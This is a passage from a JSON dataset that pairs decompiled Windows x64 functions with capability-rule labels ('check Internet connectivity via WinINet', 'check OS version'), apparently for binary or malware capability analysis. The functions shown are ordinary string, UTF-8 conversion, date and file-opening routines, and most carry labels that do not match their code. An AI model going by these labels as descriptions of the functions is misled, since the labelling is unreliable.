        "decompiled_code": "\nint64_t * fcn.1400770c0(int64_t *arg1, int64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint8_t *puVar9;\n    uint64_t uVar10;\n    uint64_t arg1_00;\n    int64_t in_R8;\n    int64_t iVar11;\n    \n    piVar5 = *0x140102a70;\n    piVar6 = *(*arg1 + -0x18);\n    if (0x3ffffffffffffff9 < arg2) {\n        puVar9 = 0x1400fd8ff;\n        piVar6 = fcn.1400b7170(0x1400fd8ff);\n        if (in_R8 == 1) {\n            uVar3 = *arg2;\n            *puVar9 = uVar3;\n            return uVar3;\n        }\n        if (in_R8 != 0) {\n    // WARNING: Could not recover jumptable at 0x000140018630. Too many branches\n    // WARNING: Treating indirect jump as call\n            piVar6 = (*_sym.imp.msvcrt.dll_memcpy)();\n            return piVar6;\n        }\n        return piVar6;\n    }\n    if (piVar6 < arg2) {\n        arg2 = arg2 - piVar6;\n        if (arg2 == NULL) {\n            return arg1;\n        }\n        iVar7 = *arg1;\n        iVar11 = *(iVar7 + -0x18);\n        piVar6 = 0x3ffffffffffffff9 - iVar11;\n        if (piVar6 < arg2) {\n            piVar8 = 0x1400fd8ea;\n            fcn.1400b7170(0x1400fd8ea);\n            iVar7 = *piVar8;\n            if (*(iVar7 + -8) < 0) {\n                *(iVar7 + -8) = 0;\n            }\n            iVar11 = *piVar6;\n            if (*(iVar11 + -8) < 0) {\n                *(iVar11 + -8) = 0;\n            }\n            *piVar8 = iVar11;\n            *piVar6 = iVar7;\n            return piVar8;\n        }\n        uVar10 = arg2 + iVar11;\n        if (uVar10 <= *(iVar7 + -0x10)) {\n            if (**0x140102a70 == 0) {\n                if (*(iVar7 + -8) < 1) goto code_r0x000140076825;\n            }\n            else if (*(iVar7 + -8) < 1) {\n                iVar7 = *arg1;\n                iVar11 = *(iVar7 + -0x18);\n                goto code_r0x000140076825;\n            }\n        }\n        fcn.140077810(arg1, uVar10);\n        iVar7 = *arg1;\n        iVar11 = *(iVar7 + -0x18);\ncode_r0x000140076825:\n        if (arg2 == 0x1) {\n            *(iVar7 + iVar11) = in_R8;\n        }\n        else {\n            sub.msvcrt.dll_memset(iVar7 + iVar11, in_R8, arg2);\n        }\n        iVar7 = *arg1;\n        *(iVar7 + -8) = 0;\n        *(iVar7 + -0x18) = uVar10;\n        *(iVar7 + uVar10) = 0;\n        return arg1;\n    }\n    if (piVar6 <= arg2) {\n        return piVar6;\n    }\n    piVar6 = piVar6 - arg2;\n    iVar7 = *arg1;\n    puVar9 = piVar6 + arg2;\n    uVar10 = *(iVar7 + -0x10);\n    arg1_00 = *(iVar7 + -0x18) - piVar6;\n    iVar11 = *(iVar7 + -0x18) - puVar9;\n    if (arg1_00 <= uVar10) {\n        if (**0x140102a70 == 0) {\n            piVar8 = piVar6;\n            if (*(iVar7 + -8) < 1) {\ncode_r0x000140077a43:\n                if ((iVar11 != 0) && (piVar6 != NULL)) {\n                    if (iVar11 == 1) {\n                        uVar3 = puVar9[iVar7];\n                        piVar8 = uVar3;\n                        *(iVar7 + arg2) = uVar3;\n                        iVar7 = *arg1;\n                    }\n                    else {\n                        piVar8 = sub.msvcrt.dll_memmove(iVar7 + arg2, puVar9 + iVar7, iVar11);\n                        iVar7 = *arg1;\n                    }\n                }\n                goto code_r0x0001400779d5;\n            }\n        }\n        else {\n            piVar8 = *(iVar7 + -8);\n            if (*(iVar7 + -8) < 1) {\n                iVar7 = *arg1;\n                goto code_r0x000140077a43;\n            }\n            uVar10 = *(*arg1 + -0x10);\n        }\n    }\n    iVar7 = fcn.140076110(arg1_00, uVar10);\n    if (arg2 == NULL) {\ncode_r0x0001400779b6:\n        if (iVar11 == 0) goto code_r0x0001400779bb;\ncode_r0x0001400779f8:\n        puVar2 = arg2 + iVar7 + 0x18;\n        if (iVar11 == 1) {\n            *puVar2 = puVar9[*arg1];\n            goto code_r0x0001400779bb;\n        }\n        sub.msvcrt.dll_memcpy(puVar2, puVar9 + *arg1, iVar11);\n        iVar11 = *arg1;\n        if (*piVar5 == 0) goto code_r0x0001400779c5;\ncode_r0x000140077a23:\n        LOCK();\n        puVar1 = iVar11 + -8;\n        uVar4 = *puVar1;\n        *puVar1 = *puVar1 - 1;\n    }\n    else {\n        if (arg2 != 0x1) {\n            sub.msvcrt.dll_memcpy(iVar7 + 0x18, *arg1, arg2);\n            goto code_r0x0001400779b6;\n        }\n        *(iVar7 + 0x18) = **arg1;\n        if (iVar11 != 0) goto code_r0x0001400779f8;\ncode_r0x0001400779bb:\n        iVar11 = *arg1;\n        if (*piVar5 != 0) goto code_r0x000140077a23;\ncode_r0x0001400779c5:\n        uVar4 = *(iVar11 + -8);\n        *(iVar11 + -8) = uVar4 - 1;\n    }\n    piVar8 = uVar4;\n    if (uVar4 < 1) {\n        piVar8 = fcn.1400b64d0(iVar11 + -0x18);\n    }\n    iVar7 = iVar7 + 0x18;\n    *arg1 = iVar7;\ncode_r0x0001400779d5:\n    *(iVar7 + -8) = 0;\n    *(iVar7 + -0x18) = arg1_00;\n    *(iVar7 + arg1_00) = 0;\n    return piVar8;\n}\n",
        "token_count": 1702
    },
    "14007716": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140077160(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if ((*(iVar1 + -8) < 0) || (*(iVar1 + -0x18) == 0)) {\n        return;\n    }\n    if (**0x140102a70 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x000140077195;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1;\n        goto code_r0x000140077195;\n    }\n    fcn.140077920(arg1, 0, 0, 0);\n    iVar1 = *arg1;\ncode_r0x000140077195:\n    *(iVar1 + -8) = 0xffffffff;\n    return;\n}\n",
        "token_count": 194
    },
    "14007742": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140077420(int64_t *arg1, ulong *arg2, uint64_t arg3, uchar *arg4)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t *piVar4;\n    uchar *puVar5;\n    uint64_t arg3_00;\n    ulong *arg4_00;\n    ulong unaff_R14;\n    uint64_t in_stack_00000028;\n    \n    piVar1 = *0x140102a70;\n    puVar5 = *arg1;\n    arg4_00 = *(puVar5 + -0x18);\n    if (arg4_00 < arg2) {\ncode_r0x000140077630:\n        arg1_00 = fcn.1400b1a60(0x1400fd790, 0x1400fd87e, arg2, arg4_00);\n        fcn.140075fa0(arg4 + -0x18);\n        fcn.14000f000(arg1_00);\n        piVar4 = fcn.140077420(arg1_00, unaff_R14, arg2, *arg4_00);\n        return piVar4;\n    }\n    arg3_00 = arg4_00 - arg2;\n    if (arg3 < arg4_00 - arg2) {\n        arg3_00 = arg3;\n    }\n    if ((0x3ffffffffffffff9 - arg4_00) + arg3_00 < in_stack_00000028) {\n        fcn.1400b7170(0x1400fd87e);\n        goto code_r0x000140077630;\n    }\n    if ((arg4 < puVar5) || (arg4_00 + puVar5 < arg4)) {\ncode_r0x000140077530:\n        fcn.140077920(arg1, arg2, arg3_00, in_stack_00000028);\n        if (in_stack_00000028 != 0) {\n            if (in_stack_00000028 == 1) {\n                *(arg2 + *arg1) = *arg4;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(arg2 + *arg1, arg4, in_stack_00000028);\n            }\n        }\n    }\n    else {\n        if (**0x140102a70 == 0) {\n            if (0 < *(puVar5 + -8)) goto code_r0x000140077530;\n        }\n        else {\n            if (0 < *(puVar5 + -8)) goto code_r0x000140077530;\n            puVar5 = *arg1;\n        }\n        if (puVar5 + arg2 < arg4 + in_stack_00000028) {\n            if (arg4 < puVar5 + arg2 + arg3_00) {\n                puVar5 = fcn.1400759e0(arg4, arg4 + in_stack_00000028);\n                fcn.140077920(arg1, arg2, arg3_00, in_stack_00000028);\n                if (in_stack_00000028 != 0) {\n                    if (in_stack_00000028 == 1) {\n                        *(arg2 + *arg1) = *puVar5;\n                    }\n                    else {\n                        sub.msvcrt.dll_memcpy(arg2 + *arg1, puVar5, in_stack_00000028);\n                    }\n                }\n                if (*piVar1 == 0) {\n                    iVar3 = *(puVar5 + -8);\n                    *(puVar5 + -8) = iVar3 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = puVar5 + -8;\n                    iVar3 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (0 < iVar3) {\n                    return arg1;\n                }\n                fcn.1400b64d0(puVar5 + -0x18);\n                return arg1;\n            }\n            iVar2 = (in_stack_00000028 - arg3_00) - puVar5;\n        }\n        else {\n            iVar2 = -puVar5;\n        }\n        fcn.140077920(arg1, arg2, arg3_00, in_stack_00000028);\n        puVar5 = *arg1 + arg2;\n        if (in_stack_00000028 == 1) {\n            *puVar5 = arg4[*arg1 + iVar2];\n        }\n        else if (in_stack_00000028 != 0) {\n            sub.msvcrt.dll_memcpy(puVar5, arg4 + *arg1 + iVar2, in_stack_00000028);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1053
    },
    "140078b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140078b30(int64_t arg1, uchar *arg2)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    ushort *puVar5;\n    uint32_t uVar6;\n    char in_R8B;\n    \n    uVar2 = *(arg1 + 0x18);\n    *arg2 = 0x25;\n    puVar5 = arg2 + 1;\n    if ((uVar2 & 0x800) != 0) {\n        arg2[1] = 0x2b;\n        puVar5 = arg2 + 2;\n    }\n    if ((uVar2 & 0x400) != 0) {\n        *puVar5 = 0x23;\n        puVar5 = puVar5 + 1;\n    }\n    uVar6 = uVar2 & 0x104;\n    if (uVar6 == 0x104) {\n        if (in_R8B != '\\0') {\n            *puVar5 = in_R8B;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x41;\n        *(puVar5 + 1) = 0;\n        return;\n    }\n    *puVar5 = *0x140100fec;\n    puVar1 = puVar5 + 1;\n    if (in_R8B != '\\0') {\n        *(puVar5 + 1) = in_R8B;\n        puVar1 = puVar5 + 3;\n    }\n    if (uVar6 == 4) {\n        cVar4 = 'f';\n    }\n    else {\n        uVar3 = -((uVar2 & 0x4000) == 0) & 0x20;\n        if (uVar6 == 0x100) {\n            cVar4 = uVar3 + 0x45;\n        }\n        else {\n            cVar4 = uVar3 + 0x47;\n        }\n    }\n    *puVar1 = cVar4;\n    *(puVar1 + 1) = 0;\n    return;\n}\n",
        "token_count": 504
    },
    "14007b13": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.14007b130(int16_t *arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int16_t **arg1_00;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint8_t in_stack_00000028;\n    int16_t *piStack56;\n    int64_t iStack48;\n    \n    piStack56 = arg1;\n    if (((((in_stack_00000028 & 4) != 0) && (2 < arg2 - arg1)) && (*arg1 == -0x4411)) && (*(arg1 + 1) == -0x41)) {\n        piStack56 = arg1 + 3;\n    }\n    uVar3 = 0;\n    uVar2 = 1;\n    arg1_00 = &piStack56;\n    iStack48 = arg2;\n    if (1 < arg3) {\n        do {\n            uVar1 = fcn.14007b660(arg1_00, arg4);\n            if (arg4 < uVar1) {\n                return piStack56;\n            }\n            if (uVar1 < 0x10000) {\n                uVar2 = uVar3;\n            }\n            uVar3 = uVar2 + 1;\n            uVar2 = uVar2 + 2;\n        } while (uVar2 < arg3);\n    }\n    if (arg3 != uVar2) {\n        return piStack56;\n    }\n    uVar1 = 0xffff;\n    if (arg4 < 0x10000) {\n        uVar1 = arg4;\n    }\n    fcn.14007b660(&piStack56, uVar1);\n    return piStack56;\n}\n",
        "token_count": 397
    },
    "14007b34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007b340(int16_t **arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int16_t *piVar2;\n    \n    uVar1 = *arg2;\n    if (((uVar1 & 4) != 0) && (piVar2 = *arg1,  1 < arg1[1] - piVar2)) {\n        if (*piVar2 == -2) {\n            *arg1 = piVar2 + 1;\n            *arg2 = uVar1 & 0xfffffffe;\n            return;\n        }\n        if (*piVar2 == -0x101) {\n            *arg1 = piVar2 + 1;\n            *arg2 = uVar1 | 1;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "14007b39": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.14007b390(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t in_R8D;\n    int32_t iVar2;\n    \n    iVar2 = (arg1 + 0x76c) - (arg2 < 2);\n    iVar1 = iVar2 + 3;\n    if (-1 < iVar2) {\n        iVar1 = iVar2;\n    }\n    return ((((((iVar1 >> 2) + (arg1 + -0x46) * 0x16d) - iVar2 / 100) - ((iVar1 >> 2) % 0x19 >> 0x1f)) + iVar2 / 400 +\n             *(arg2 * 2 + 0x1401039a0) + -0x1da + in_R8D) % 7 + 7U) % 7;\n}\n",
        "token_count": 198
    },
    "14007b4d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.14007b4d0(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    puVar3 = *arg1;\n    uVar5 = arg1[1] - puVar3;\n    if (arg1[1] == puVar3) {\n        return 0xfffffffe;\n    }\n    uVar1 = *puVar3;\n    if (uVar1 < 0x80) {\n        *arg1 = puVar3 + 1;\n        return uVar1;\n    }\n    if (0xc1 < uVar1) {\n        if (uVar1 < 0xe0) {\n            if (uVar5 == 1) {\n                return 0xfffffffe;\n            }\n            if ((puVar3[1] & 0xc0) == 0x80) {\n                uVar4 = uVar1 * 0x40 + -0x3080 + puVar3[1];\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 2;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf0) {\n            if (uVar5 < 3) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((uVar2 & 0xc0) == 0x80) && (((uVar1 != 0xe0 || (0x9f < uVar2)) && ((puVar3[2] & 0xc0) == 0x80)))) {\n                uVar4 = uVar1 * 0x1000 + -0xe2080 + puVar3[2] + uVar2 * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 3;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf5) {\n            if (uVar5 < 4) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((((uVar2 & 0xc0) == 0x80) && ((uVar1 != 0xf0 || (0x8f < uVar2)))) &&\n                ((uVar1 != 0xf4 || (uVar2 < 0x90)))) && (((puVar3[2] & 0xc0) == 0x80 && ((puVar3[3] & 0xc0) == 0x80))))\n            {\n                uVar4 = uVar1 * 0x40000 + -0x3c82080 + puVar3[3] + uVar2 * 0x1000 + puVar3[2] * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 4;\n                return uVar4;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 724
    },
    "14007b66": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.14007b660(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    puVar3 = *arg1;\n    uVar5 = arg1[1] - puVar3;\n    if (arg1[1] == puVar3) {\n        return 0xfffffffe;\n    }\n    uVar1 = *puVar3;\n    if (uVar1 < 0x80) {\n        *arg1 = puVar3 + 1;\n        return uVar1;\n    }\n    if (0xc1 < uVar1) {\n        if (uVar1 < 0xe0) {\n            if (uVar5 == 1) {\n                return 0xfffffffe;\n            }\n            if ((puVar3[1] & 0xc0) == 0x80) {\n                uVar4 = uVar1 * 0x40 + -0x3080 + puVar3[1];\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 2;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf0) {\n            if (uVar5 < 3) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((uVar2 & 0xc0) == 0x80) && (((uVar1 != 0xe0 || (0x9f < uVar2)) && ((puVar3[2] & 0xc0) == 0x80)))) {\n                uVar4 = uVar1 * 0x1000 + -0xe2080 + puVar3[2] + uVar2 * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 3;\n                return uVar4;\n            }\n        }\n        else if (uVar1 < 0xf5) {\n            if (uVar5 < 4) {\n                return 0xfffffffe;\n            }\n            uVar2 = puVar3[1];\n            if (((((uVar2 & 0xc0) == 0x80) && ((uVar1 != 0xf0 || (0x8f < uVar2)))) &&\n                ((uVar1 != 0xf4 || (uVar2 < 0x90)))) && (((puVar3[2] & 0xc0) == 0x80 && ((puVar3[3] & 0xc0) == 0x80))))\n            {\n                uVar4 = uVar1 * 0x40000 + -0x3c82080 + puVar3[3] + uVar2 * 0x1000 + puVar3[2] * 0x40;\n                if (arg2 < uVar4) {\n                    return uVar4;\n                }\n                *arg1 = puVar3 + 4;\n                return uVar4;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 722
    },
    "14007b7f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14007b7f0(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    \n    uVar2 = arg2;\n    if (arg2 < 0x80) {\n        puVar1 = *arg1;\n        if (arg1[1] == puVar1) {\n            return 0;\n        }\n        *arg1 = puVar1 + 1;\n        *puVar1 = uVar2;\n    }\n    else if (arg2 < 0x800) {\n        puVar1 = *arg1;\n        if (arg1[1] - puVar1 < 2) {\n            return 0;\n        }\n        *puVar1 = (arg2 >> 6) - 0x40;\n        *arg1 = puVar1 + 2;\n        puVar1[1] = (uVar2 & 0x3f) + 0x80;\n    }\n    else if (arg2 < 0x10000) {\n        puVar1 = *arg1;\n        if (arg1[1] - puVar1 < 3) {\n            return 0;\n        }\n        *puVar1 = (arg2 >> 0xc) - 0x20;\n        puVar1[1] = (arg2 >> 6 & 0x3f) + 0x80;\n        *arg1 = puVar1 + 3;\n        puVar1[2] = (uVar2 & 0x3f) + 0x80;\n    }\n    else {\n        if (0x10ffff < arg2) {\n            return 0;\n        }\n        puVar1 = *arg1;\n        if (arg1[1] - puVar1 < 4) {\n            return 0;\n        }\n        *puVar1 = (arg2 >> 0x12) - 0x10;\n        puVar1[1] = (arg2 >> 0xc & 0x3f) + 0x80;\n        puVar1[2] = (arg2 >> 6 & 0x3f) + 0x80;\n        *arg1 = puVar1 + 4;\n        puVar1[3] = (uVar2 & 0x3f) + 0x80;\n    }\n    return 1;\n}\n",
        "token_count": 528
    },
    "14007b91": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14007b910(uint8_t **arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    \n    if (arg2 < 0x80) {\n        puVar1 = *arg1;\n        if (arg1[1] == puVar1) {\n            return 0;\n        }\n        *arg1 = puVar1 + 1;\n        *puVar1 = arg2;\n    }\n    else {\n        if (arg2 < 0x800) {\n            puVar1 = *arg1;\n            if (arg1[1] - puVar1 < 2) {\n                return 0;\n            }\n            *arg1 = puVar1 + 1;\n            *puVar1 = (arg2 >> 6) - 0x40;\n        }\n        else {\n            if (arg2 < 0x10000) {\n                puVar1 = *arg1;\n                if (arg1[1] - puVar1 < 3) {\n                    return 0;\n                }\n                *arg1 = puVar1 + 1;\n                *puVar1 = (arg2 >> 0xc) - 0x20;\n            }\n            else {\n                if (0x10ffff < arg2) {\n                    return 0;\n                }\n                puVar1 = *arg1;\n                if (arg1[1] - puVar1 < 4) {\n                    return 0;\n                }\n                *arg1 = puVar1 + 1;\n                *puVar1 = (arg2 >> 0x12) - 0x10;\n                puVar1 = *arg1;\n                *arg1 = puVar1 + 1;\n                *puVar1 = (arg2 >> 0xc & 0x3f) + 0x80;\n            }\n            puVar1 = *arg1;\n            *arg1 = puVar1 + 1;\n            *puVar1 = (arg2 >> 6 & 0x3f) + 0x80;\n        }\n        puVar1 = *arg1;\n        *arg1 = puVar1 + 1;\n        *puVar1 = (arg2 & 0x3f) + 0x80;\n    }\n    return 1;\n}\n",
        "token_count": 496
    },
    "14007bdd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14007bdd0(uint16_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    ushort *puVar2;\n    char cVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    uint64_t arg2_00;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t in_stack_00000028;\n    \n    if ((arg4 & 2) != 0) {\n        puVar2 = *arg2;\n        if (arg2[1] - puVar2 < 3) {\n            return 1;\n        }\n        *(puVar2 + 1) = 0xbf;\n        *puVar2 = 0xbbef;\n        *arg2 = *arg2 + 3;\n    }\n    puVar4 = *arg1;\n    uVar6 = arg1[1] - puVar4;\n    if (arg1[1] != puVar4) {\n        do {\n            uVar1 = *puVar4;\n            arg2_00 = uVar1;\n            uVar5 = uVar1;\n            if (uVar1 - 0xd800 < 0x400) {\n                if (in_stack_00000028 == 1) {\n                    return 2;\n                }\n                if (uVar6 < 3) {\n                    return 0;\n                }\n                if (0x3ff < puVar4[1] - 0xdc00) {\n                    return 2;\n                }\n                iVar7 = 2;\n                uVar5 = puVar4[1] + 0xfca02400 + uVar5 * 0x400;\n                arg2_00 = uVar5;\n            }\n            else {\n                if (uVar1 - 0xdc00 < 0x400) {\n                    return 2;\n                }\n                iVar7 = 1;\n            }\n            if (arg3 < uVar5) {\n                return 2;\n            }\n            cVar3 = fcn.14007b910(arg2, arg2_00);\n            if (cVar3 == '\\0') {\n                return 1;\n            }\n            puVar4 = *arg1 + iVar7;\n            *arg1 = puVar4;\n            uVar6 = arg1[1] - puVar4;\n        } while (puVar4 != arg1[1]);\n    }\n    return 0;\n}\n",
        "token_count": 544
    },
    "14007bf3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14007bf30(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.14001a420(arg3);\n    if ((iVar1 != 0) && (*arg1 == 0)) {\n        iVar1 = fcn.14000fa40(arg2, iVar1);\n        *arg1 = iVar1;\n        if (iVar1 != 0) {\n            *(arg1 + 1) = 1;\n            return arg1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 129
    },
    "14007bf8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14007bf80(int64_t **arg1, ulong arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t **ppiVar3;\n    ushort uVar4;\n    int64_t iVar5;\n    ulong uStack16;\n    \n    iVar2 = fcn.14001a420(arg3 & 0xffffffff);\n    if ((iVar2 == 0) || (*arg1 != NULL)) {\ncode_r0x00014007bff8:\n        ppiVar3 = NULL;\n    }\n    else {\n        uStack16 = 0;\n        iVar5 = 0;\n        do {\n            cVar1 = *(iVar2 + iVar5);\n            if (cVar1 == 'b') {\n                uVar4 = 0x62;\n            }\n            else if (cVar1 < 'c') {\n                if (cVar1 == '+') {\n                    uVar4 = 0x2b;\n                }\n                else {\n                    if (cVar1 != 'a') goto code_r0x00014007bff8;\n                    uVar4 = 0x61;\n                }\n            }\n            else if (cVar1 == 'r') {\n                uVar4 = 0x72;\n            }\n            else {\n                if (cVar1 != 'w') goto code_r0x00014007bff8;\n                uVar4 = 0x77;\n            }\n            *(&uStack16 + iVar5 * 2) = uVar4;\n            iVar5 = iVar5 + 1;\n        } while (*(iVar2 + iVar5) != '\\0');\n        ppiVar3 = (*_sym.imp.msvcrt.dll__wfopen)(arg2);\n        *arg1 = ppiVar3;\n        if (ppiVar3 != NULL) {\n            *(arg1 + 1) = 1;\n            ppiVar3 = arg1;\n        }\n    }\n    return ppiVar3;\n}\n",
        "token_count": 432
    },
    "14007c05": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c050(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    if (*arg1 == 0) {\n        return NULL;\n    }\n    if (*(arg1 + 1) == '\\0') {\n        *arg1 = 0;\n    }\n    else {\n        iVar1 = fcn.1400185a0();\n        *arg1 = 0;\n        if (iVar1 != 0) {\n            return NULL;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 116
    },
    "14007c1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
